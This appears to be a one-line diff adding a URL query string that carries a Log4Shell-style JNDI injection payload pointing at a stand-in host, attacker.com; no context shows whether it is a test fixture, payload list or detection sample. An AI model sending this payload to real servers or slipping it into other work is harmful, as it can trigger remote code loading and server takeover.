@@ -1,0 +1,1 @@
+/?x=${jndi:ldap://attacker.com/a}
